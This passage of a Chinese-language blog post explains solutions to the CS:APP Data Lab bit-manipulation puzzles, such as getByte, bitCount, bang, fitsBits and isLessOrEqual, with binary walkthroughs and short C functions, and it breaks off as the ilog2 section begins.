x&amp;y using only ~ and |</span></span><br><span class="line"><span class="comment"> *   Example: bitAnd(6, 5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ |</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitAnd</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ~( ~x | ~y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="getByte"><a href="#getByte" class="headerlink" title="getByte"></a>getByte</h2><p>获取一个整数x中的第n个字节，n的范围在<code>0 &lt;= n &lt;= 3</code>，例如<code>getByte(0x12345678,1) = 0x56</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为6，等级为2。</p><p>可以利用位且操作符的性质，让其余位清0即可获取指定位的数值，例如<code>0x1234 &amp; 0x00ff= 0x34</code>，<code>0x1234 &amp; 0xff00 = 0x12</code>。可以让0xff左移n*8位就可以获取第n个字节，其余位都被清0了，之后再将获取到的字节右移回n*8位就可以了。由于无法使用乘号<code>*</code>，但是乘数刚好是2的倍数，因此可以使用左移代替乘法<code>n * 8 = n &lt;&lt; 3</code>。原理如下所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; x&#x3D;0x12345678, n&#x3D;1</span><br><span class="line">0x12345678</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将0xff左移8*1位</span><br><span class="line">0x000000ff</span><br><span class="line">0x0000ff00</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 与原数进行位且运算</span><br><span class="line">0x00005600</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 再右移8*1位</span><br><span class="line">0x00000056</span><br></pre></td></tr></table></figure><p>注意C语言里使用的是算术右移，即有符号数右移时符号位保持不变，符号位向右移动后正数在符号位补0，负数补1，因此若右移了一个负数，则被右移的位数上将都为1，因此在最后还需要使用位且运算符只保留前1个字节。如下所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; x&#x3D;0x80000000, n&#x3D;3</span><br><span class="line">0x80000000</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将0xff左移8*3位</span><br><span class="line">0x000000ff</span><br><span class="line">0xff000000</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 进行位且运算</span><br><span class="line">0x80000000</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 再右移8*3位</span><br><span class="line">0xffffff80 &#x2F;&#x2F; 由于是负数，符号位补1，因此右移了很多1</span><br><span class="line">0x000000ff &#x2F;&#x2F; 进行位且运算将其余字节清0</span><br><span class="line">0x00000080</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * getByte - Extract byte n from word x</span><br><span class="line"> *   Bytes numbered from 0 (LSB) to 3 (MSB)</span><br><span class="line"> *   Examples: getByte(0x12345678,1) &#x3D; 0x56</span><br><span class="line"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="line"> *   Max ops: 6</span><br><span class="line"> *   Rating: 2</span><br><span class="line"> *&#x2F;</span><br><span class="line">int getByte(int x, int n) &#123;</span><br><span class="line">    return ((x &amp; (0xff&lt;&lt;(n&lt;&lt;3))) &gt;&gt; (n&lt;&lt;3)) &amp; 0xff;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="logicalShift"><a href="#logicalShift" class="headerlink" title="logicalShift"></a>logicalShift</h2><p>将整数x右移n位，n的范围在<code>0 &lt;= n &lt;= 31</code>，例如<code>logicalShift(0x87654321,4) = 0x08765432</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为20，等级为3。</p><p>在C语言里的位右移是算术右移，若右移的数是有符号数，则符号位正数补0，负数补1，例如0x8000右移8位得到0xff80，而逻辑右移是不管符号位的，全部补0。因此在执行算术右移以后，需要将被移动的位数全部清0。将0x1左移31位以后就变成了0x80000000(0b100000…)，这时再使用算术右移n-1位就可以将前n-1位指定为1，再取反就可以将前n-1位清0。原理如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x00000001</span><br><span class="line">&#x2F;&#x2F; 左移31位</span><br><span class="line">0x80000000</span><br><span class="line">&#x2F;&#x2F; 再右移n-1位，假设n&#x3D;5</span><br><span class="line">0xf8000000</span><br><span class="line">&#x2F;&#x2F; 变成0b1111 1000 0000... 再取反</span><br><span class="line">0x07ffffff</span><br><span class="line">&#x2F;&#x2F; 变成0b0000 0111 1111...</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 假设原数为0x80000000，即0b1000 0000 0000...</span><br><span class="line">0x80000000</span><br><span class="line">&#x2F;&#x2F; 将原数算术右移n&#x3D;5位，变成0b1111 1100 0000...</span><br><span class="line">0xfc000000</span><br><span class="line">&#x2F;&#x2F; 再与前面得到的0x07ffffff位且运算，前5位被清零</span><br><span class="line">0x04000000</span><br><span class="line">&#x2F;&#x2F; 即可得到逻辑位移的结果</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalShift</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> one = <span class="number">0x1</span>;</span><br><span class="line">    <span class="keyword">return</span> (x &gt;&gt; n) &amp; ~(((one &lt;&lt; <span class="number">31</span>) &gt;&gt; n) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="bitCount"><a href="#bitCount" class="headerlink" title="bitCount"></a>bitCount</h2><p>获得整数v中二进制1的个数，例如<code>bitCount(5) = 2, bitCount(7) = 3</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为40，等级为4。<br>这个题非常难，其原理就是将32位进行分组，每2位为一组，分别计算出每组1的数量，关于计算每组1的数量可以使用010101…这样的掩码，先用位且运算计算每组低位1的数量，再将原数右移1位计算每组高位1的数量，相加即可得到每组1的数量，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 假设原数为0x7a2d，其二进制如下</span><br><span class="line">0b01 11 10 10 00 10 11 01</span><br><span class="line">&#x2F;&#x2F; 掩码如下</span><br><span class="line">0b01 01 01 01 01 01 01 01</span><br><span class="line">&#x2F;&#x2F; 进行且或运算得到每组低位1的数量得到结果a</span><br><span class="line">0b01 01 00 00 00 00 01 01</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将原数右移1位，这样高位就到了低位</span><br><span class="line">0b00 11 11 01 00 01 01 10</span><br><span class="line">&#x2F;&#x2F; 与掩码进行且或运算计算每组低位1的数量得到结果b</span><br><span class="line">0b00 01 01 01 00 01 01 00</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将结果a与结果b相加即可得到每组1的数量</span><br><span class="line">0b01 01 00 00 00 00 01 01 +</span><br><span class="line">0b00 01 01 01 00 01 01 00 &#x3D;</span><br><span class="line">0b01 10 01 01 00 01 10 01</span><br></pre></td></tr></table></figure><p>之后再每2组相加得到每4组1的数量，相加可以使用掩码00110011…，分别得到低两位1的数量与高两位1的数量，再相加，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 刚才计算每两位为一组的1的数量</span><br><span class="line">0b0110 0101 0001 1001</span><br><span class="line">&#x2F;&#x2F; 掩码如下</span><br><span class="line">0b0011 0011 0011 0011</span><br><span class="line">&#x2F;&#x2F; 进行且或运算得到每组低两位的1的数量得到结果a</span><br><span class="line">0b0010 0001 0001 0001</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将原数右移2位，这样高两位就到了低两位</span><br><span class="line">0b0001 1001 0100 0110</span><br><span class="line">&#x2F;&#x2F; 与掩码进行且或运算计算每4位一组的低两位1的数量得到结果b</span><br><span class="line">0b0001 0001 0000 0001</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 将结果a与结果b相加即可得到每组1的数量</span><br><span class="line">0b0010 0001 0001 0001 +</span><br><span class="line">0b0001 0001 0000 0001 &#x3D;</span><br><span class="line">0b0011 0010 0001 0010</span><br></pre></td></tr></table></figure><p>之后再重复这样的操作，再分为8位一组计算，掩码为0b0000111100001111…，再分为16位一组计算，掩码为0b0000000011111111…，最后相加即可得到32位里1的数量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bitCount - returns count of number of 1&#x27;s in word</span></span><br><span class="line"><span class="comment"> *   Examples: bitCount(5) = 2, bitCount(7) = 3</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 40</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitCount</span><span class="params">(<span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp = <span class="number">0x55</span>|(<span class="number">0x55</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">int</span> mask_2bit = tmp|(tmp&lt;&lt;<span class="number">16</span>);  <span class="comment">// 0b01010101...</span></span><br><span class="line">    tmp = <span class="number">0x33</span>|(<span class="number">0x33</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">int</span> mask_4bit = tmp|(tmp&lt;&lt;<span class="number">16</span>); <span class="comment">// 0b001100110011...</span></span><br><span class="line">    tmp = <span class="number">0x0f</span>|(<span class="number">0x0f</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">int</span> mask_8bit = tmp|(tmp&lt;&lt;<span class="number">16</span>);  <span class="comment">// 0b0000111100001111...</span></span><br><span class="line">    <span class="keyword">int</span> mask_16bit = <span class="number">0xff</span>|(<span class="number">0xff</span>&lt;&lt;<span class="number">16</span>);  <span class="comment">// 0b0000000011111111...</span></span><br><span class="line">    <span class="keyword">int</span> mask_32bit = <span class="number">0xff</span>|(<span class="number">0xff</span>&lt;&lt;<span class="number">8</span>);  <span class="comment">// 00000000000000001111111111...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> c = (v&amp;mask_2bit) + ((v&gt;&gt;<span class="number">1</span>)&amp;mask_2bit);  <span class="comment">// Each group with 2 bits.</span></span><br><span class="line">    c = (c&amp;mask_4bit) + ((c&gt;&gt;<span class="number">2</span>)&amp;mask_4bit);  <span class="comment">// Each group with 4 bits.</span></span><br><span class="line">    c = (c&amp;mask_8bit) + ((c&gt;&gt;<span class="number">4</span>)&amp;mask_8bit);  <span class="comment">// Each group with 8 bits.</span></span><br><span class="line">    c = (c&amp;mask_16bit) + ((c&gt;&gt;<span class="number">8</span>)&amp;mask_16bit);  <span class="comment">// Each group with 16 bits.</span></span><br><span class="line">    <span class="keyword">return</span> (c&amp;mask_32bit) + ((c&gt;&gt;<span class="number">16</span>)&amp;mask_32bit);  <span class="comment">// Only one group with 32 bits.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="bang"><a href="#bang" class="headerlink" title="bang"></a>bang</h2><p>不使用非运算符计算出<code>!x</code>，例如<code>bang(3) = 0, bang(0) = 1</code>。允许的操作符为<code>~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为12，等级为4。</p><p>非运算符的作用非常简单，就是0返回1，非0返回0，所以重点就需要判断输入的数是否是0。关于判断是否为0有两种方法，一种是将二进制位所有高位的1全部右移到低位，直到只剩下1个二进制位为止，直接判断该二进制是否为0即可，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 设原数x为0x18</span><br><span class="line">0b00011000</span><br><span class="line">&#x2F;&#x2F; 右移一半(4位)</span><br><span class="line">0b00000001</span><br><span class="line">&#x2F;&#x2F; 与原数做位或运算得到结果a</span><br><span class="line">0b00011001</span><br><span class="line">&#x2F;&#x2F; 再将a右移一半(2位)</span><br><span class="line">0b00000110</span><br><span class="line">&#x2F;&#x2F; 与a做位或运算得到结果b</span><br><span class="line">0b00011111</span><br><span class="line">&#x2F;&#x2F; 再将b右移一半(1位)</span><br><span class="line">0b00001111</span><br><span class="line">&#x2F;&#x2F; 与b做位或运算得到结果c</span><br><span class="line">0b00011111</span><br><span class="line">&#x2F;&#x2F; 取c的最后一位就可以判断原数x是否含有1</span><br></pre></td></tr></table></figure><p>另一种方法就是利用0的补码的特殊性质。计算补码使用的公式为<code>~x+1</code>，而除了0和0x80000000以外其他数使用该公式都会得到其相反数，最高位符号位总是不同。而0和0x80000000这两个数计算出来的则是他们本身：如果要计算0的补码，就需要计算<code>~0+1</code>，而~0的值是0xffffffff，如果再加1则会溢出，变成0x0，所以0的补码还是0，最高位也是0，而0x80000000的补码最高位还是1，因此就可以通过比较<code>x</code>与<code>~x+1</code>的符号位是否是1来判断<code>x</code>是否是0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * bang - Compute !x without using !</span></span><br><span class="line"><span class="comment"> *   Examples: bang(3) = 0, bang(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bang</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; <span class="number">31</span>) | ((~x + <span class="number">0x1</span>) &gt;&gt; <span class="number">31</span>)) + <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Two’s-Complement-Arithmetic"><a href="#Two’s-Complement-Arithmetic" class="headerlink" title="Two’s Complement Arithmetic"></a>Two’s Complement Arithmetic</h1><h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><p>返回最小的补码整数。限制的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>。最大操作符数目为4。等级为1。</p><p>最小的补码整数为0x80000000。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fitsBits"><a href="#fitsBits" class="headerlink" title="fitsBits"></a>fitsBits</h2><p>判断一个数x是否可以用n位补码表示，其中<code>1 &lt;= n &lt;= 32</code>。例如<code>fitsBits(5,3) = 0, fitsBits(-4,3) = 1</code>。允许使用的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>。最大操作符数量为15。等级为2。</p><p>此题化简一下就是需要判断：</p><ol><li>如果是正数且x的第n位为0，那么就可以用n位补码表示。</li><li>如果是负数且x的第n位为1，那么就可以用n位补码表示。</li></ol><p>其原理为：如果要用n位的补码表示，那么所表示出来的补码第n位必须作为符号位，如果原码第n位与其符号位不相同，那么就需要n+1位补码才能表示。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 0x5</span><br><span class="line">0b0000...0101</span><br><span class="line">&#x2F;&#x2F; 其补码为</span><br><span class="line">0b0000...0101</span><br><span class="line">&#x2F;&#x2F; 如果要用3位补码表示那么表示出的补码第3位必须为0，但是0x5的原码第3为是1，所以至少需要4位0b0101才能表示0x5。</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; -0x4</span><br><span class="line">0b1000...0100</span><br><span class="line">&#x2F;&#x2F; 其补码为</span><br><span class="line">0b1111...1100</span><br><span class="line">&#x2F;&#x2F; 补码的第3位是1，正好可以代表符号位，因此可以用3为补码0b100代表-4。</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * fitsBits - return 1 if x can be represented as an</span></span><br><span class="line"><span class="comment"> *  n-bit, two&#x27;s complement integer.</span></span><br><span class="line"><span class="comment"> *   1 &lt;= n &lt;= 32</span></span><br><span class="line"><span class="comment"> *   Examples: fitsBits(5,3) = 0, fitsBits(-4,3) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fitsBits</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> isNeg = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">     <span class="keyword">int</span> shift = n + (~<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span> (!(x &gt;&gt; shift) &amp; !isNeg) | (!(~x &gt;&gt; shift) &amp; isNeg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="divpwr2"><a href="#divpwr2" class="headerlink" title="divpwr2"></a>divpwr2</h2><p>实现计算x除以2的n次方，其中<code>0 &lt;= n &lt;= 30</code>，向0取整，例如<code>divpwr2(15,1) = 7, divpwr2(-33,4) = -2</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为15，等级为2。</p><p>如果是正数的话右移n位就是除以2的n次方，但是对负数并不适用，由于需要向0取整，而移位运算都是向下取整，因此就需要给负数添加一个补充值：$2^n-1$</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span></span><br><span class="line"><span class="comment"> *  Round toward zero</span></span><br><span class="line"><span class="comment"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">divpwr2</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> comple = (<span class="number">1</span>&lt;&lt;n) + (~<span class="number">0</span>);  <span class="comment">// 2^n - 1</span></span><br><span class="line">    <span class="keyword">return</span> (x + ((x &gt;&gt; <span class="number">31</span>) &amp; comple)) &gt;&gt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><p>返回x的相反数，例如<code>negate(1) = -1</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为5，等级为2。</p><p>前面提到过，使用计算补码的公式即可得到一个数的相反数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * negate - return -x</span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ~x + <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isPositive"><a href="#isPositive" class="headerlink" title="isPositive"></a>isPositive</h2><p>判断一个数是否为正数，例如<code>isPositive(-1) = 0</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为8，等级为3。</p><p>首先需要使用<code>!x</code>判断是否为0，之后就可以判断符号位是否为1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isPositive - return 1 if x &gt; 0, return 0 otherwise</span></span><br><span class="line"><span class="comment"> *   Example: isPositive(-1) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isPositive</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> isZero = !x;</span><br><span class="line">    <span class="keyword">return</span> !((x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>) &amp; !isZero;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h2><p>判断一个数是否小于等于另一个数，例如<code>isLessOrEqual(4,5) = 1</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为24，等级为3。</p><p>根据不等式的性质可以将<code>x &lt;= y</code>转化为<code>0 &lt;= y-x</code>，就是需要判断<code>y-x</code>是不是负数，其中<code>-x</code>可以表示为<code>~x+1</code>，但是要分三种情况：</p><ol><li>x和y同号，直接做减法不会溢出。</li><li>x和y异号，可能会发生溢出。该情况下若x为负数，则肯定返回1，否则肯定返回0。</li><li>x和y相等。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0</span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> diffSign = !(x &gt;&gt; <span class="number">31</span>) ^ !(y &gt;&gt; <span class="number">31</span>);</span><br><span class="line">    <span class="keyword">return</span> (diffSign &amp; (x &gt;&gt; <span class="number">31</span>)) | (!diffSign &amp; !((y + (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ilog2"><a href="#ilog2" class="headerlink" title="ilog2"></a>ilog2</h2><p>返回以2为底的log(x)，其中<code>x &gt; 0</code>，例如<code>ilog2(16) = 4</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为90，等级为4。</p><p>此题解法来自<a href="https://stackoverflow.com/questions/21442088/computing-the-floor-of-log-2x-using-only-bitwise-operators-in-c">stackoverflow</a></p><p>可以用公式表示为<br>$$log_2(x) = 16<em>a + 8</em>b + 4<em>c 